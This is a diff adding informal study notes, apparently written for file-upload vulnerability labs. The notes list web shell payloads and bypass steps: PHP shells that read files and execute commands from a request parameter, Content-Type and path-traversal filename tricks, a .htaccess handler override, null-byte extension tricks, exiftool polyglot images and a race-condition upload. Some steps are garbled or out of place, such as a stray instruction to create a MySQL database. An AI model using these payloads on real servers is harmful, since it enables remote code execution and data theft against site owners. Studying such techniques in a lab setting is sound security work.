@@ -1,0 +1,43 @@
+                #Remote code execution via web shell upload#
+1.write a code (<?php echo file_get_contents('/path/to/target/file '); ?>) and save it as php.
+2.upload this php file as a image . this excute and find a code 
+ 
+			#Web shell upload via Content-Type restriction bypass#
+
+1.A more versatile web shell may look something like this: 	<?php echo system($_GET['command']); ?>
+2.go POST /my-account/avatar and sent repeter.
+3. change content-type and give image/jpeg
+						
+						#Web shell upload via path traversal#
+1.go POST /my-account/avatar  and sent repeter
+2. of content-deposition: change filename and give filename="../exploit.php"
+3.  / sign decode url like %2f ..
+4. clear history and reaload  browser and find newe url and copy and paste browser.
+
+                          #Web shell upload via extension blacklist bypass#
+1.upload a shell . but it does not upload . try bypass blacklist
+2.create a database on mysql server . so follow this -
+       
+  Change the value of the filename parameter to .htaccess.
+  Change the value of the Content-Type header to text/plain.
+  Replace the contents of the file (your PHP payload) with the following Apache directive:
+  AddType application/x-httpd-php .l33t		
+  after then sent it .
+3.go back and Change the value of the filename parameter from exploit.php to exploit.l33t. Send the request again and notice that the file was uploaded successfully.
+
+                        #Web shell upload via extension blacklist bypass#
+1. tru upload shell but it does not work.
+2. check proxy history and find "post account requetsts"
+2.change file name extension like (exploit.php%00.jpg)
+
+                        #upload a polyglot image user "exiftool command "
+1. take a image and use this command -> exiftool -comment=" here your shell" iamgename.jpg -o image.php
+2. exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+                                       #Web shell upload via race condition#
+1. tryb upload shell . but it does not upload . add extension .jpg (harun.php%00.jpg)
+2. and find a /file/avaters/harun.php%00.php sent it intruder. andthan null payload attack untill 200 response ok.
+
+
+                                        #Advance Upload Pyload #
+										
